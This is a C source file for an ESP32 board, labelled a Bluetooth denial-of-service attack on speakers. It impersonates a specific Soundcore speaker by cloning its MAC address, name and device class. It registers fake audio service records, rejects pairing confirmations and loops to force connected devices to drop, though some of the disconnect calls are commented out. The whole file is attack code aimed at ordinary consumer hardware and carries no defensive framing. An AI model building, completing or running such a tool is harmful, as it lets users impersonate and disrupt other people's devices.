// bt_dos_attack.c - ESP-IDF Bluetooth DoS for speakers

#include "nvs_flash.h"
#include "esp_bt.h"
#include "esp_log.h"
#include "esp_bt_main.h"
#include "esp_bt_device.h"
#include "esp_gap_bt_api.h"
#include "esp_sdp_api.h"     // For SDP intercepts
#include "esp_l2cap_bt_api.h" // For L2CAP intercepts
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_mac.h"
#include <string.h>
#include "esp_l2cap_bt_api.h"
#include "esp_avrc_api.h"
#include "esp_a2dp_api.h"

static const char *TAG = "BT_DOS_ATTACK";

// SoundCore speaker to spoof - use the one you found (F4:4E:FD:03:A6:DC)
static uint8_t speaker_mac[6] = {0xF4, 0x4E, 0xFD, 0x03, 0xA6, 0xDC};
static char *speaker_name = "Soundcore fuc"; // Change to match exact speaker name

// Track connected devices
#define MAX_CONNECTED_DEVICES 5
static esp_bd_addr_t connected_devices[MAX_CONNECTED_DEVICES];
static uint8_t num_connected_devices = 0;

// A2DP service record (simplified version)
static const uint8_t a2dp_service_record[] = {
    // Service Class ID List
    0x09, 0x00, 0x01, 0x35, 0x03, 0x19, 0x11, 0x0A,  // Audio Sink UUID
    // Protocol Descriptor List
    0x09, 0x00, 0x04, 0x35, 0x0C, 0x35, 0x03, 0x19, 0x01, 0x00, 0x35, 0x05, 0x19, 0x00, 0x03, 0x08, 0x00
};

// AVRCP service record (simplified version)
static const uint8_t avrcp_service_record[] = {
    // Service Class ID List
    0x09, 0x00, 0x01, 0x35, 0x03, 0x19, 0x11, 0x0E,  // AVRCP UUID
    // Protocol Descriptor List 
    0x09, 0x00, 0x04, 0x35, 0x10, 0x35, 0x06, 0x19, 0x01, 0x00, 0x09, 0x00, 0x17, 0x35, 0x06, 0x19, 0x00, 0x17, 0x09, 0x01, 0x00
};

// L2CAP callback to intercept connection requests
static void bt_l2cap_cb(esp_bt_l2cap_cb_event_t event, esp_bt_l2cap_cb_param_t *param)
{
    switch (event) {
        case ESP_BT_L2CAP_OPEN_EVT:
            ESP_LOGI(TAG, "L2CAP connection open - forcing disconnect");
            // Wait briefly then force disconnect
            vTaskDelay(pdMS_TO_TICKS(100));
            // esp_bt_l2cap_connect(param->open.handle);
            break;
            
        case ESP_BT_L2CAP_CL_INIT_EVT:
            ESP_LOGI(TAG, "L2CAP client initiated connection - allowing setup then will disconnect");
            break;
            
        default:
            break;
    }
}

// SDP callback to intercept service queries
static void bt_sdp_cb(esp_sdp_cb_event_t event, esp_sdp_cb_param_t *param)
{
    switch (event) {
        case ESP_SDP_SEARCH_COMP_EVT:
            ESP_LOGI(TAG, "SDP discovery complete - will disconnect soon");
            break;
            
        default:
            break;
    }
}

// Extended GAP callback with better handling
static void bt_gap_cb(esp_bt_gap_cb_event_t event, esp_bt_gap_cb_param_t *param)
{
    char addr_str[18];
    
    switch (event) {
        case ESP_BT_GAP_AUTH_CMPL_EVT:
            sprintf(addr_str, "%02x:%02x:%02x:%02x:%02x:%02x",
                    param->auth_cmpl.bda[0], param->auth_cmpl.bda[1], param->auth_cmpl.bda[2],
                    param->auth_cmpl.bda[3], param->auth_cmpl.bda[4], param->auth_cmpl.bda[5]);
            ESP_LOGI(TAG, "Authentication with %s - status: %d", addr_str, param->auth_cmpl.stat);
            break;
            
        case ESP_BT_GAP_ACL_CONN_CMPL_STAT_EVT:
            // When ACL connection completes
            sprintf(addr_str, "%02x:%02x:%02x:%02x:%02x:%02x",
                    param->acl_conn_cmpl_stat.bda[0], param->acl_conn_cmpl_stat.bda[1], 
                    param->acl_conn_cmpl_stat.bda[2], param->acl_conn_cmpl_stat.bda[3], 
                    param->acl_conn_cmpl_stat.bda[4], param->acl_conn_cmpl_stat.bda[5]);
            ESP_LOGI(TAG, "ACL connection with %s complete - intercepting", addr_str);
            
            // Add to connected devices list
            if (num_connected_devices < MAX_CONNECTED_DEVICES) {
                memcpy(connected_devices[num_connected_devices], 
                       param->acl_conn_cmpl_stat.bda, ESP_BD_ADDR_LEN);
                num_connected_devices++;
            }
            break;
            
        case ESP_BT_GAP_ACL_DISCONN_CMPL_STAT_EVT:
            // When ACL disconnection completes
            sprintf(addr_str, "%02x:%02x:%02x:%02x:%02x:%02x",
                    param->acl_disconn_cmpl_stat.bda[0], param->acl_disconn_cmpl_stat.bda[1], 
                    param->acl_disconn_cmpl_stat.bda[2], param->acl_disconn_cmpl_stat.bda[3], 
                    param->acl_disconn_cmpl_stat.bda[4], param->acl_disconn_cmpl_stat.bda[5]);
            ESP_LOGI(TAG, "ACL disconnection with %s complete", addr_str);
            
            // Remove from connected devices list
            for (int i = 0; i < num_connected_devices; i++) {
                if (memcmp(connected_devices[i], param->acl_disconn_cmpl_stat.bda, ESP_BD_ADDR_LEN) == 0) {
                    // Shift remaining entries
                    for (int j = i; j < num_connected_devices - 1; j++) {
                        memcpy(connected_devices[j], connected_devices[j + 1], ESP_BD_ADDR_LEN);
                    }
                    num_connected_devices--;
                    break;
                }
            }
            break;
            
            
        case ESP_BT_GAP_CFM_REQ_EVT:
            // Reject confirmation request
            ESP_LOGI(TAG, "Confirmation request - rejecting");
            esp_bt_gap_ssp_confirm_reply(param->cfm_req.bda, false);
            break;
            
        case ESP_BT_GAP_KEY_REQ_EVT:
            // Cannot provide key
            ESP_LOGI(TAG, "Key request - cannot provide key");
            // No API to respond with wrong key directly
            break;
            
        default:
            break;
    }
}

// Task to actively disconnect devices by initiating pairing
void disconnect_task(void *pvParameters)
{
    while (1) {
        // For each connected device
        for (int i = 0; i < num_connected_devices; i++) {
            char addr_str[18];
            sprintf(addr_str, "%02x:%02x:%02x:%02x:%02x:%02x",
                    connected_devices[i][0], connected_devices[i][1], connected_devices[i][2],
                    connected_devices[i][3], connected_devices[i][4], connected_devices[i][5]);
            
            ESP_LOGI(TAG, "Forcing authentication with %s", addr_str);
            
            // // Force authentication - this will fail and cause disconnect
            // esp_bt_gap_set_security(connected_devices[i], ESP_BT_SEC_AUTHENTICATE);
        }
        
        // Wait between cycles
        vTaskDelay(pdMS_TO_TICKS(2000));
    }
}

void setup_fake_sdp_services(void) {
    uint32_t a2dp_handle = 0;
    uint32_t avrcp_handle = 0;
    
    // Register A2DP Sink service
    esp_sdp_register_record(a2dp_service_record, sizeof(a2dp_service_record), &a2dp_handle);
    ESP_LOGI(TAG, "Registered fake A2DP service, handle: %d", a2dp_handle);
    
    // Register AVRCP Target service
    esp_sdp_register_record(avrcp_service_record, sizeof(avrcp_service_record), &avrcp_handle);
    ESP_LOGI(TAG, "Registered fake AVRCP service, handle: %d", avrcp_handle);
}

void app_main(void)
{
    esp_err_t ret;
    
    // Initialize NVS
    ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);
    
    // Release BLE memory
    ESP_ERROR_CHECK(esp_bt_controller_mem_release(ESP_BT_MODE_BLE));
    
    // Set MAC address BEFORE initializing controller
    ESP_LOGI(TAG, "Setting Bluetooth MAC to match speaker: %02x:%02x:%02x:%02x:%02x:%02x",
            speaker_mac[0], speaker_mac[1], speaker_mac[2],
            speaker_mac[3], speaker_mac[4], speaker_mac[5]);
    
    ESP_ERROR_CHECK(esp_iface_mac_addr_set(speaker_mac, ESP_MAC_BT));
    
    // Initialize controller
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_bt_controller_init(&bt_cfg));
    ESP_ERROR_CHECK(esp_bt_controller_enable(ESP_BT_MODE_CLASSIC_BT));
    
    // Initialize Bluedroid
    ESP_ERROR_CHECK(esp_bluedroid_init());
    ESP_ERROR_CHECK(esp_bluedroid_enable());
    
    // Register callbacks
    ESP_ERROR_CHECK(esp_bt_gap_register_callback(bt_gap_cb));
    ESP_ERROR_CHECK(esp_sdp_register_callback(bt_sdp_cb));
    ESP_ERROR_CHECK(esp_bt_l2cap_register_callback(bt_l2cap_cb));
    
    // Set device name to match real speaker
    ESP_ERROR_CHECK(esp_bt_dev_set_device_name(speaker_name));
    
    // Make device discoverable & connectable
    ESP_ERROR_CHECK(esp_bt_gap_set_scan_mode(ESP_BT_CONNECTABLE, ESP_BT_GENERAL_DISCOVERABLE));
    
    // Set security parameters - require authentication
    {
        esp_bt_sp_param_t param_type = ESP_BT_SP_IOCAP_MODE;
        esp_bt_io_cap_t iocap = ESP_BT_IO_CAP_IO;
        ESP_ERROR_CHECK(esp_bt_gap_set_security_param(param_type, &iocap, sizeof(uint8_t)));
    }
    
    // Set to match a speaker's Class of Device
    esp_bt_cod_t cod;
    cod.major = 4;        // Audio/Video
    cod.minor = 5;        // Loudspeaker
    cod.service = 0x20;   // Audio service
    ESP_ERROR_CHECK(esp_bt_gap_set_cod(cod, ESP_BT_SET_COD_ALL));
    
    // Start task to periodically disconnect devices
    xTaskCreate(disconnect_task, "disconnect_task", 2048, NULL, 5, NULL);
    
    ESP_LOGI(TAG, "Bluetooth DoS attack started");
    ESP_LOGI(TAG, "Spoofing: %s (%02x:%02x:%02x:%02x:%02x:%02x)",
             speaker_name, speaker_mac[0], speaker_mac[1], speaker_mac[2],
             speaker_mac[3], speaker_mac[4], speaker_mac[5]);

    // Add fake SDP services to make attack more effective
    setup_fake_sdp_services();
}